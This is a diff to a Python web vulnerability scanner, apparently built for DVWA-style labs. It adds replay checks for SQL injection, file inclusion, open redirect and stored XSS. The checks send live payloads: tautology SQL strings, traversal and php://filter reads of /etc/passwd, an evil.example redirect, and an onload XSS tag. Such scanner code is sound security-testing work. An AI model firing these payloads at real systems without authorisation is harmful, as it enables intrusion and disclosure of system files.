@@ -148,16 +148,127 @@ def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tupl
     return False, "not reflected"
 
 
+# SQL-error signatures (MySQL/generic) — strong, low-FP.
+_SQL_ERRORS = [
+    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
+    "supplied argument is not a valid mysql", "sqlstate[", "unclosed quotation mark",
+    "quoted string not properly terminated", "sql syntax.*mysql", "mysqli_",
+    "pg_query", "psql:", "sqlite3::", "odbc sql", "microsoft ole db",
+]
+_REDIRECT_PARAMS = {"redirect", "url", "next", "return", "returnurl", "dest", "destination",
+                    "go", "target", "rurl", "redir", "continue", "forward"}
+
+
+def _req(method, url, param, value, cookie, follow=True):
+    import httpx
+    headers = {"Cookie": cookie} if cookie else {}
+    # Include Submit=Submit: DVWA-style forms only process the input when the submit button
+    # is present. Harmless extra param elsewhere.
+    if method == "POST":
+        return httpx.post(url, data={param: value, "Submit": "Submit"}, headers=headers,
+                          follow_redirects=follow, timeout=12)
+    return httpx.get(url, params={param: value, "Submit": "Submit"}, headers=headers,
+                     follow_redirects=follow, timeout=12)
+
+
+def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
+    """Error-based (inject a quote -> DB error) then boolean-based (true vs false response
+    length differs). Strong signatures only, to stay low false-positive."""
+    try:
+        err = _req(method, url, param, "1'\"", cookie).text.lower()
+    except Exception as exc:  # noqa: BLE001
+        return False, f"replay error: {exc}"
+    for sig in _SQL_ERRORS:
+        if sig in err:
+            return True, f"SQL error signature: {sig!r}"
+    # boolean-based: TRUE payload vs FALSE payload should differ materially
+    try:
+        t = _req(method, url, param, "1' OR '1'='1", cookie).text
+        f = _req(method, url, param, "1' AND '1'='2", cookie).text
+        base = _req(method, url, param, "1", cookie).text
+    except Exception:  # noqa: BLE001
+        return False, "boolean replay failed"
+    if len(t) != len(f) and abs(len(t) - len(base)) < abs(len(f) - len(base)):
+        return True, f"boolean-based diff (true={len(t)} false={len(f)} base={len(base)})"
+    return False, "no SQL error or boolean signal"
+
+
+def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
+    """Local/Remote file read: try classic traversal + php filter wrappers, confirm by the
+    /etc/passwd root line signature."""
+    payloads = ["/etc/passwd", "../../../../../../etc/passwd",
+                "....//....//....//....//etc/passwd",
+                "php://filter/convert.base64-encode/resource=/etc/passwd"]
+    for p in payloads:
+        try:
+            r = _req(method, url, param, p, cookie)
+        except Exception:  # noqa: BLE001, S112
+            continue
+        if "root:x:0:0" in r.text:
+            return True, f"read /etc/passwd via {p!r}"
+        if "cm9vdDp4OjA6MDp" in r.text:  # base64 of 'root:x:0:0:'
+            return True, f"read /etc/passwd (base64 filter) via {p!r}"
+    return False, "no file-read signature"
+
+
+def verify_open_redirect(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
+    """Only meaningful on redirect-ish params: inject an external URL and confirm the app
+    issues a 30x Location to it (do NOT follow redirects)."""
+    if param.lower() not in _REDIRECT_PARAMS:
+        return False, "param not redirect-like"
+    evil = "https://evil.example/x"
+    try:
+        r = _req(method, url, param, evil, cookie, follow=False)
+    except Exception as exc:  # noqa: BLE001
+        return False, f"replay error: {exc}"
+    # 1) HTTP 30x Location header
+    loc = r.headers.get("location", "")
+    if r.status_code in (301, 302, 303, 307, 308) and "evil.example" in loc:
+        return True, f"30x redirect to {loc}"
+    # 2) body-based redirect: meta refresh / window.location / anchor to the injected URL
+    body = r.text.lower()
+    if "evil.example" in body:
+        for pat in ("http-equiv=\"refresh\"", "http-equiv='refresh'", "window.location",
+                    "location.href", "location.replace", "location.assign"):
+            if pat in body:
+                return True, f"body-based redirect ({pat}) to evil.example"
+    return False, f"no external redirect (status {r.status_code})"
+
+
+def verify_stored_xss(target: Target, param: str, cookie: str) -> tuple[bool, str]:
+    """Inject via the form, then re-fetch the page and check the payload persisted unencoded."""
+    import httpx
+    marker = "stx7q2z"
+    payload = f"<sVg/onload=alert({marker})>"
+    headers = {"Cookie": cookie} if cookie else {}
+    data = {p: (target.values.get(p) or "x") for p in target.params}
+    data[param] = payload
+    data.setdefault("Submit", "Submit")
+    try:
+        httpx.post(target.url, data=data, headers=headers, follow_redirects=True, timeout=12)
+        view = httpx.get(target.csrf_url or target.url, headers=headers,
+                         follow_redirects=True, timeout=12)
+    except Exception as exc:  # noqa: BLE001
+        return False, f"replay error: {exc}"
+    if payload in view.text:
+        return True, "stored payload persisted unencoded"
+    return False, "not stored / encoded"
+
+
 def verify_finding(f: Finding, cookie: str) -> Finding:
     if f.category == "command-injection":
         ok, note = verify_cmdi(f.url, f.param or "ip", f.method, cookie)
     elif f.category == "xss":
         ok, note = verify_reflected_xss(f.url, f.param or "", f.method, cookie)
+    elif f.category == "sql-injection":
+        ok, note = verify_sqli(f.url, f.param or "id", f.method, cookie)
+    elif f.category == "file-inclusion":
+        ok, note = verify_lfi(f.url, f.param or "page", f.method, cookie)
+    elif f.category == "open-redirect":
+        ok, note = verify_open_redirect(f.url, f.param or "redirect", f.method, cookie)
     else:
-        # sql-injection and others: trust the tool's own confirmation (sqlmap/ghauri only
-        # report confirmed injections); mark verified by-tool.
         f.verified = None
-        f.verify_note = "tool-confirmed (no independent replay for this class yet)"
+        f.verify_note = "tool-confirmed (no independent replay for this class)"
         return f
     f.verified = ok
     f.verify_note = note
@@ -201,19 +312,37 @@ def run_sqlmap(t: Target, cookie: str) -> list[Finding]:
 
 
 def probe_targets(targets: list[Target], cookie: str) -> list[Finding]:
-    """Completeness safety-net: independently replay cmd-injection and XSS on every discovered
-    target, so a payload-set gap in a scanner does not become a missed finding."""
+    """Completeness safety-net: independently replay EVERY blatant-vuln class on every
+    discovered param, so a payload-set gap in any scanner does not become a missed finding.
+    Deterministic, strong-signature checks only (low false-positive)."""
     out: list[Finding] = []
+
+    def add(cat, url, param, method, note):
+        out.append(Finding(tool="verify", category=cat, url=url, param=param,
+                           method=method, evidence=note, verified=True))
+
     for t in targets:
         for param in t.params:
-            okc, notec = verify_cmdi(t.url, param, t.method, cookie)
-            if okc:
-                out.append(Finding(tool="verify", category="command-injection", url=t.url,
-                                   param=param, method=t.method, evidence=notec, verified=True))
-            okx, notex = verify_reflected_xss(t.url, param, t.method, cookie)
-            if okx:
-                out.append(Finding(tool="verify", category="xss", url=t.url, param=param,
-                                   method=t.method, evidence=notex, verified=True))
+            ok, note = verify_cmdi(t.url, param, t.method, cookie)
+            if ok:
+                add("command-injection", t.url, param, t.method, note)
+            ok, note = verify_reflected_xss(t.url, param, t.method, cookie)
+            if ok:
+                add("xss", t.url, param, t.method, note)
+            ok, note = verify_sqli(t.url, param, t.method, cookie)
+            if ok:
+                add("sql-injection", t.url, param, t.method, note)
+            ok, note = verify_lfi(t.url, param, t.method, cookie)
+            if ok:
+                add("file-inclusion", t.url, param, t.method, note)
+            ok, note = verify_open_redirect(t.url, param, t.method, cookie)
+            if ok:
+                add("open-redirect", t.url, param, t.method, note)
+            # stored XSS only makes sense on POST forms (inject then re-view the page)
+            if t.method == "POST":
+                ok, note = verify_stored_xss(t, param, cookie)
+                if ok:
+                    add("xss", t.url, param, t.method, f"stored: {note}")
     return out
 
 
